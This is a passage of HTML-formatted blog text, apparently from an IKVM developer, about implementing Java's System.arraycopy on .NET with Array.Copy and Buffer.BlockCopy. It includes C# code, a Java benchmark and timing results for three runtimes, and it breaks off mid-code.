style="FONT-SIZE: 10pt">srcPos</SPAN></I></CODE><I 
style="mso-bidi-font-style: normal"> through </I><CODE><I 
style="mso-bidi-font-style: normal"><SPAN 
style="FONT-SIZE: 10pt">srcPos</SPAN></I></CODE><I>k</I><CODE><I 
style="mso-bidi-font-style: normal"><SPAN 
style="FONT-SIZE: 10pt">-1</SPAN></I></CODE><I 
style="mso-bidi-font-style: normal"> will already have been copied to 
destination array positions </I><CODE><I 
style="mso-bidi-font-style: normal"><SPAN 
style="FONT-SIZE: 10pt">destPos</SPAN></I></CODE><I 
style="mso-bidi-font-style: normal"> through </I><CODE><I 
style="mso-bidi-font-style: normal"><SPAN 
style="FONT-SIZE: 10pt">destPos</SPAN></I></CODE><I>k</I><CODE><I 
style="mso-bidi-font-style: normal"><SPAN 
style="FONT-SIZE: 10pt">-1</SPAN></I></CODE><I 
style="mso-bidi-font-style: normal"> and no other positions of the destination 
array will have been modified.?<o:p></O:P></I></P>
<P>In other words, if an <SPAN 
style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">ArrayStoreException</SPAN> 
is thrown, all elements prior to the one that failed are copied. In contrast to 
this, the .NET documentation for <SPAN 
style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">Array.Copy</SPAN> says:</P>
<P><I style="mso-bidi-font-style: normal">“If this method throws an exception 
while copying, the state of </I><SPAN 
style="mso-bidi-font-style: italic">destinationArray</SPAN><I 
style="mso-bidi-font-style: normal"> is undefined.?<o:p></O:P></I></P>
<P>So to be strictly correct, we cannot rely on <SPAN 
style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">Array.Copy</SPAN> to 
implement copying of reference arrays that might throw an exception during 
copying. Here is a better implementation of <SPAN 
style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">System.arraycopy</SPAN>:</P>
<P><SPAN style="FONT-SIZE: 10pt; COLOR: blue; FONT-FAMILY: 'Courier New'">public 
static void </SPAN><SPAN 
style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">arraycopy(<SPAN 
style="COLOR: blue">object</SPAN> src, <SPAN style="COLOR: blue">int</SPAN> 
srcStart,<BR><SPAN style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
</SPAN><SPAN style="mso-spacerun: yes">&nbsp;</SPAN><SPAN 
style="COLOR: blue">object</SPAN> dest, <SPAN style="COLOR: blue">int</SPAN> 
destStart, <SPAN style="COLOR: blue">int</SPAN> length) {<BR><SPAN 
style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp; </SPAN><SPAN 
style="COLOR: green">// fast path if source and destination are 
same<BR></SPAN><SPAN style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp; </SPAN><SPAN 
style="COLOR: blue">if</SPAN>(src != dest) {<BR><SPAN 
style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp; </SPAN><SPAN 
style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp;&nbsp;</SPAN>Type type_src = 
src.GetType();<BR><SPAN style="mso-spacerun: yes">&nbsp;&nbsp; </SPAN><SPAN 
style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp;&nbsp;</SPAN><SPAN 
style="mso-spacerun: yes">&nbsp;</SPAN>Type type_dst =       dest.GetType();<BR><SPAN 
style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp; </SPAN><SPAN 
style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp;&nbsp;</SPAN><SPAN 
style="COLOR: green">// fast path if arrays are of identical type<BR><SPAN 
style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp; </SPAN><SPAN 
style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp;&nbsp;</SPAN></SPAN><SPAN 
style="COLOR: blue">if</SPAN>(type_src != type_dst) {<BR><SPAN 
style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </SPAN><SPAN 
style="mso-spacerun: yes">&nbsp;</SPAN><SPAN 
style="mso-spacerun: yes">&nbsp;</SPAN><SPAN 
style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp;</SPAN><SPAN 
style="COLOR: blue">if</SPAN>(len &lt; 0) {<BR><SPAN 
style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </SPAN><SPAN 
style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</SPAN><SPAN 
style="COLOR: blue">throw</SPAN> <FONT 
color=#0000ff>new</FONT>ArrayIndexOutOfBoundsException();<BR><SPAN 
style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp; </SPAN><SPAN 
style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</SPAN>}<BR><SPAN 
style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp; </SPAN><SPAN 
style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</SPAN><SPAN 
style="COLOR: blue">try</SPAN> {<BR><SPAN 
style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
</SPAN><SPAN 
style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</SPAN>Object[] 
src1 = (Object[])src;<BR><SPAN 
style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
</SPAN><SPAN 
style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</SPAN>Object[] 
dst1 = (Object[])dest;<BR><SPAN 
style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
</SPAN><SPAN 
style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</SPAN><SPAN 
style="COLOR: blue">for</SPAN>(; len &gt; 0; len--) {<BR><SPAN 
style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
</SPAN><SPAN 
style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</SPAN>dst1[destStart++] 
= src1[srcStart++];<BR><SPAN 
style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
</SPAN><SPAN 
style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</SPAN>}<BR><SPAN 
style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp; </SPAN><SPAN 
style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</SPAN>} 
<SPAN style="COLOR: blue">catch</SPAN>(InvalidCastException) {<BR><SPAN 
style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
</SPAN><SPAN 
style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</SPAN><SPAN 
style="COLOR: blue">throw</SPAN> JavaException.ArrayStoreException();<BR><SPAN 
style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp; </SPAN><SPAN 
style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</SPAN>}<BR><SPAN 
style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
</SPAN>}<BR><SPAN style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp; </SPAN>}<BR><SPAN 
style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp; </SPAN><SPAN 
style="COLOR: blue">try</SPAN> {<BR><SPAN 
style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
</SPAN>Array.Copy((Array)src, srcStart,<BR><SPAN 
style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
</SPAN>(Array)dest, destStart, length);<BR><SPAN 
style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp; </SPAN>} <SPAN 
style="COLOR: blue">catch</SPAN>(ArgumentNullException) {<BR><SPAN 
style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
</SPAN><SPAN style="COLOR: blue">throw new</SPAN> 
NullReferenceException();<BR><SPAN style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp; 
</SPAN>} <SPAN style="COLOR: blue">catch</SPAN>(ArgumentException) {<BR><SPAN 
style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
</SPAN><SPAN style="COLOR: blue">throw</SPAN> <FONT 
color=#0000ff>new</FONT> 
ArrayIndexOutOfBoundsException();<BR><SPAN 
style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp; </SPAN>} <SPAN 
style="COLOR: blue">catch</SPAN>(InvalidCastException) {<BR><SPAN 
style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
</SPAN><SPAN style="COLOR: blue">throw</SPAN> <FONT 
color=#0000ff>new</FONT> 
ArrayStoreException();<BR><SPAN 
style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp; </SPAN>}<BR>}<o:p></O:P></SPAN></P>
<P>I think this is a correct implementation of <SPAN 
style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">System.arraycopy</SPAN>. 
It’s still not perfect though, because it turns out to be really slow. Here is a 
small benchmark:</P>
<P><SPAN 
style="FONT-SIZE: 10pt; COLOR: blue; FONT-FAMILY: 'Courier New'">class</SPAN><SPAN 
style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"> arraycopy {<BR><SPAN 
style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp; </SPAN><SPAN 
style="COLOR: blue">public static void</SPAN> main(String[] args){<BR><SPAN 
style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
</SPAN>test(10, 10000000);<BR><SPAN 
style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
</SPAN>test(100, 1000000);<BR><SPAN 
style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
</SPAN>test(1000, 100000);<BR><SPAN style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp; 
</SPAN>}<o:p></O:P></SPAN></P>
<P><SPAN style="FONT-SIZE: 10pt; COLOR: blue; FONT-FAMILY: 'Courier New'"><SPAN 
style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp; </SPAN>private static 
void</SPAN><SPAN style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"> test(<SPAN 
style="COLOR: blue">int</SPAN> size, <SPAN style="COLOR: blue">int</SPAN> count) 
{<BR><SPAN style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
</SPAN><SPAN style="COLOR: blue">int</SPAN>[] a = <SPAN style="COLOR: blue">new 
int</SPAN>[size];<BR><SPAN 
style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
</SPAN><SPAN style="COLOR: blue">int</SPAN>[] b = <SPAN style="COLOR: blue">new 
int</SPAN>[size];<BR><SPAN 
style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
</SPAN><SPAN style="COLOR: blue">long</SPAN> start = 
System.currentTimeMillis();<BR><SPAN 
style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
</SPAN><SPAN style="COLOR: blue">for</SPAN>(<SPAN style="COLOR: blue">int</SPAN> 
i = 0; i &lt; count; i++) {<BR><SPAN 
style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
</SPAN>System.arraycopy(a, 0, b, 0, a.length);<BR><SPAN 
style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
</SPAN>}<BR><SPAN 
style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
</SPAN><SPAN style="COLOR: blue">long</SPAN> end = 
System.currentTimeMillis();<BR><SPAN 
style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
</SPAN>System.out.println(end - start);<BR><SPAN 
style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp; </SPAN>}<BR>}<o:p></O:P></SPAN></P>
<P>Here are the results for the JDK 1.1 Symantec JIT, JRE 1.4.1 HotSpot Client 
VM and IKVM running on .NET 1.0:</P>
<P>
<TABLE class=MsoNormalTable 
style="WIDTH: 215.4pt; BORDER-COLLAPSE: collapse; mso-padding-alt: 0in 5.4pt 0in 5.4pt" 
cellSpacing=0 cellPadding=0 width=287 border=0>
  
  <TR style="HEIGHT: 12.75pt; mso-yfti-irow: 0; mso-yfti-firstrow: yes">
    <TD 
    style="BORDER-RIGHT: #ece9d8; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 48pt; PADDING-TOP: 0in; BORDER-BOTTOM: #ece9d8; HEIGHT: 12.75pt; BACKGROUND-COLOR: transparent" 
    vAlign=bottom noWrap width=64>
      <P class=MsoNormal style="MARGIN: 0in 0in 0pt"><SPAN 
      style="FONT-SIZE: 10pt; FONT-FAMILY: Arial"><o:p></O:P></SPAN></P></TD>
    <TD 
    style="BORDER-RIGHT: #ece9d8; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 58.8pt; PADDING-TOP: 0in; BORDER-BOTTOM: #ece9d8; HEIGHT: 12.75pt; BACKGROUND-COLOR: transparent" 
    vAlign=bottom noWrap width=78>
      <P class=MsoNormal style="MARGIN: 0in 0in 0pt; TEXT-ALIGN: right" 
      align=right><SPAN 
      style="FONT-SIZE: 10pt; FONT-FAMILY: Arial">Symantec<o:p></O:P></SPAN></P></TD>
    <TD 
    style="BORDER-RIGHT: #ece9d8; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 59.8pt; PADDING-TOP: 0in; BORDER-BOTTOM: #ece9d8; HEIGHT: 12.75pt; BACKGROUND-COLOR: transparent" 
    vAlign=bottom noWrap width=80>
      <P class=MsoNormal style="MARGIN: 0in 0in 0pt; TEXT-ALIGN: right" 
      align=right><SPAN style="FONT-SIZE: 10pt; FONT-FAMILY: Arial">JRE 
      1.4.1<o:p></O:P></SPAN></P></TD>
    <TD 
    style="BORDER-RIGHT: #ece9d8; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 48.8pt; PADDING-TOP: 0in; BORDER-BOTTOM: #ece9d8; HEIGHT: 12.75pt; BACKGROUND-COLOR: transparent" 
    vAlign=bottom noWrap width=65>
      <P class=MsoNormal style="MARGIN: 0in 0in 0pt; TEXT-ALIGN: right" 
      align=right><SPAN 
      style="FONT-SIZE: 10pt; FONT-FAMILY: Arial">IKVM<o:p></O:P></SPAN></P></TD></TR>
  <TR style="HEIGHT: 12.75pt; mso-yfti-irow: 1">
    <TD 
    style="BORDER-RIGHT: #ece9d8; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 48pt; PADDING-TOP: 0in; BORDER-BOTTOM: #ece9d8; HEIGHT: 12.75pt; BACKGROUND-COLOR: transparent" 
    vAlign=bottom noWrap width=64>
      <P class=MsoNormal style="MARGIN: 0in 0in 0pt; TEXT-ALIGN: right" 
      align=right><SPAN 
      style="FONT-SIZE: 10pt; FONT-FAMILY: Arial">10<o:p></O:P></SPAN></P></TD>
    <TD 
    style="BORDER-RIGHT: #ece9d8; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 58.8pt; PADDING-TOP: 0in; BORDER-BOTTOM: #ece9d8; HEIGHT: 12.75pt; BACKGROUND-COLOR: transparent" 
    vAlign=bottom noWrap width=78>
      <P class=MsoNormal style="MARGIN: 0in 0in 0pt; TEXT-ALIGN: right" 
      align=right><SPAN 
      style="FONT-SIZE: 10pt; FONT-FAMILY: Arial">1012<o:p></O:P></SPAN></P></TD>
    <TD 
    style="BORDER-RIGHT: #ece9d8; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 59.8pt; PADDING-TOP: 0in; BORDER-BOTTOM: #ece9d8; HEIGHT: 12.75pt; BACKGROUND-COLOR: transparent" 
    vAlign=bottom noWrap width=80>
      <P class=MsoNormal style="MARGIN: 0in 0in 0pt; TEXT-ALIGN: right" 
      align=right><SPAN 
      style="FONT-SIZE: 10pt; FONT-FAMILY: Arial">2343<o:p></O:P></SPAN></P></TD>
    <TD 
    style="BORDER-RIGHT: #ece9d8; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 48.8pt; PADDING-TOP: 0in; BORDER-BOTTOM: #ece9d8; HEIGHT: 12.75pt; BACKGROUND-COLOR: transparent" 
    vAlign=bottom noWrap width=65>
      <P class=MsoNormal style="MARGIN: 0in 0in 0pt; TEXT-ALIGN: right" 
      align=right><SPAN 
      style="FONT-SIZE: 10pt; FONT-FAMILY: Arial">12127<o:p></O:P></SPAN></P></TD></TR>
  <TR style="HEIGHT: 12.75pt; mso-yfti-irow: 2">
    <TD 
    style="BORDER-RIGHT: #ece9d8; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 48pt; PADDING-TOP: 0in; BORDER-BOTTOM: #ece9d8; HEIGHT: 12.75pt; BACKGROUND-COLOR: transparent" 
    vAlign=bottom noWrap width=64>
      <P class=MsoNormal style="MARGIN: 0in 0in 0pt; TEXT-ALIGN: right" 
      align=right><SPAN 
      style="FONT-SIZE: 10pt; FONT-FAMILY: Arial">100<o:p></O:P></SPAN></P></TD>
    <TD 
    style="BORDER-RIGHT: #ece9d8; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 58.8pt; PADDING-TOP: 0in; BORDER-BOTTOM: #ece9d8; HEIGHT: 12.75pt; BACKGROUND-COLOR: transparent" 
    vAlign=bottom noWrap width=78>
      <P class=MsoNormal style="MARGIN: 0in 0in 0pt; TEXT-ALIGN: right" 
      align=right><SPAN 
      style="FONT-SIZE: 10pt; FONT-FAMILY: Arial">340<o:p></O:P></SPAN></P></TD>
    <TD 
    style="BORDER-RIGHT: #ece9d8; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 59.8pt; PADDING-TOP: 0in; BORDER-BOTTOM: #ece9d8; HEIGHT: 12.75pt; BACKGROUND-COLOR: transparent" 
    vAlign=bottom noWrap width=80>
      <P class=MsoNormal style="MARGIN: 0in 0in 0pt; TEXT-ALIGN: right" 
      align=right><SPAN 
      style="FONT-SIZE: 10pt; FONT-FAMILY: Arial">531<o:p></O:P></SPAN></P></TD>
    <TD 
    style="BORDER-RIGHT: #ece9d8; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 48.8pt; PADDING-TOP: 0in; BORDER-BOTTOM: #ece9d8; HEIGHT: 12.75pt; BACKGROUND-COLOR: transparent" 
    vAlign=bottom noWrap width=65>
      <P class=MsoNormal style="MARGIN: 0in 0in 0pt; TEXT-ALIGN: right" 
      align=right><SPAN 
      style="FONT-SIZE: 10pt; FONT-FAMILY: Arial">1402<o:p></O:P></SPAN></P></TD></TR>
  <TR style="HEIGHT: 12.75pt; mso-yfti-irow: 3; mso-yfti-lastrow: yes">
    <TD 
    style="BORDER-RIGHT: #ece9d8; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 48pt; PADDING-TOP: 0in; BORDER-BOTTOM: #ece9d8; HEIGHT: 12.75pt; BACKGROUND-COLOR: transparent" 
    vAlign=bottom noWrap width=64>
      <P class=MsoNormal style="MARGIN: 0in 0in 0pt; TEXT-ALIGN: right" 
      align=right><SPAN 
      style="FONT-SIZE: 10pt; FONT-FAMILY: Arial">1000<o:p></O:P></SPAN></P></TD>
    <TD 
    style="BORDER-RIGHT: #ece9d8; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 58.8pt; PADDING-TOP: 0in; BORDER-BOTTOM: #ece9d8; HEIGHT: 12.75pt; BACKGROUND-COLOR: transparent" 
    vAlign=bottom noWrap width=78>
      <P class=MsoNormal style="MARGIN: 0in 0in 0pt; TEXT-ALIGN: right" 
      align=right><SPAN 
      style="FONT-SIZE: 10pt; FONT-FAMILY: Arial">120<o:p></O:P></SPAN></P></TD>
    <TD 
    style="BORDER-RIGHT: #ece9d8; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 59.8pt; PADDING-TOP: 0in; BORDER-BOTTOM: #ece9d8; HEIGHT: 12.75pt; BACKGROUND-COLOR: transparent" 
    vAlign=bottom noWrap width=80>
      <P class=MsoNormal style="MARGIN: 0in 0in 0pt; TEXT-ALIGN: right" 
      align=right><SPAN 
      style="FONT-SIZE: 10pt; FONT-FAMILY: Arial">310<o:p></O:P></SPAN></P></TD>
    <TD 
    style="BORDER-RIGHT: #ece9d8; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 48.8pt; PADDING-TOP: 0in; BORDER-BOTTOM: #ece9d8; HEIGHT: 12.75pt; BACKGROUND-COLOR: transparent" 
    vAlign=bottom noWrap width=65>
      <P class=MsoNormal style="MARGIN: 0in 0in 0pt; TEXT-ALIGN: right" 
      align=right><SPAN 
      style="FONT-SIZE: 10pt; FONT-FAMILY: Arial">340<o:p></O:P></SPAN></P></TD></TR></TABLE></P>
<P>It’s obvious that for small arrays, the overhead is really large. The reason 
this is so much slower than the Java version is probably because of the cost of 
the call to <SPAN 
style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">GetType</SPAN> combined with 
the extra checking going on inside <SPAN 
style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">Array.Copy</SPAN>. If Sun 
had only provided overloaded versions of <SPAN 
style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">System.arraycopy</SPAN> for 
each type of primitive array, we wouldn’t need to do so much type checking! It 
turns out that even without these overloads we can still get the same result (in 
many cases), because the verifier often knows the types of the arguments. In <I 
style="mso-bidi-font-style: normal">compiles.cs</I> I added some code to the 
<SPAN style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">invokestatic</SPAN> 
handler to check for invocations of <SPAN 
style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">System.arraycopy</SPAN> and 
if the array arguments are known to be primitive arrays, the call gets 
redirected to a more efficient arraycopy implementation.</P>
<P>Here is where the call to <SPAN 
style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">System.arraycopy</SPAN> in 
the above benchmark gets redirected to:</P>
<P class=MsoNormal 
style="MARGIN: 0in 0in 0pt; mso-layout-grid-align: none"><SPAN 
style="FONT-SIZE: 10pt; COLOR: blue; FONT-FAMILY: 'Courier New'">public</SPAN><SPAN 
style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"> <SPAN 
style="COLOR: blue">static</SPAN> <SPAN style="COLOR: blue">void</SPAN> 
arraycopy_primitive_4(Array src,<BR><SPAN 
style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </SPAN><SPAN 
style="COLOR: blue">int</SPAN> srcStart, Array dest, <SPAN 
style="COLOR: blue">int</SPAN> destStart, <SPAN style="COLOR: blue">int</SPAN> 
len) {<o:p></O:P></SPAN></P>
<P class=MsoNormal 
style="MARGIN: 0in 0in 0pt; mso-layout-grid-align: none"><SPAN 
style="FONT-SIZE: 10pt; COLOR: blue; FONT-FAMILY: 'Courier New'"><SPAN 
style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp; </SPAN>try</SPAN><SPAN 
style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"> {<o:p></O:P></SPAN></P>
<P class=MsoNormal 
style="MARGIN: 0in 0in 0pt; mso-layout-grid-align: none"><SPAN 
style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"><SPAN 
style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
</SPAN><SPAN style="COLOR: blue">checked </SPAN>{<o:p></O:P></SPAN></P>
<P class=MsoNormal 
style="MARGIN: 0in 0in 0pt; mso-layout-grid-align: none"><SPAN 
style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"><SPAN 
style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
</SPAN>Buffer.BlockCopy(src, srcStart &lt;&lt; 2,<BR><SPAN 
style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
</SPAN>dest, destStart &lt;&lt; 2, len &lt;&lt; 2);<SPAN 
style="COLOR: blue"><o:p></O:P></SPAN></SPAN></P>
<P class=MsoNormal 
style="MARGIN: 0in 0in 0pt; mso-layout-grid-align: none"><SPAN 
style="FONT-SIZE: 10pt; COLOR: blue; FONT-FAMILY: 'Courier New'"><SPAN 
style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
</SPAN>return</SPAN><SPAN 
style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">;<o:p></O:P></SPAN></P>
<P class=MsoNormal 
style="MARGIN: 0in 0in 0pt; mso-layout-grid-align: none"><SPAN 
style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"><SPAN 
style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
</SPAN>}<o:p></O:P></SPAN></P>
<P class=MsoNormal 
style="MARGIN: 0in 0in 0pt; mso-layout-grid-align: none"><SPAN 
style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"><SPAN 
style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp; </SPAN>} <SPAN 
style="COLOR: blue">catch</SPAN>(ArgumentNullException) {<o:p></O:P></SPAN></P>
<P class=MsoNormal 
style="MARGIN: 0in 0in 0pt; mso-layout-grid-align: none"><SPAN 
style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"><SPAN 
style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
</SPAN><SPAN style="COLOR: blue">throw</SPAN> <SPAN 
style="COLOR: blue">new</SPAN> NullReferenceException();<o:p></O:P></SPAN></P>
<P class=MsoNormal 
style="MARGIN: 0in 0in 0pt; mso-layout-grid-align: none"><SPAN 
style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"><SPAN 
style="mso-spacerun: yes">&nbsp;&nbsp;&nbsp; </SPAN>} <SPAN 
style="COLOR: blue">catch</SPAN>(OverflowException) {<o:p></O:P></SPAN></P>
<P class=MsoNormal 
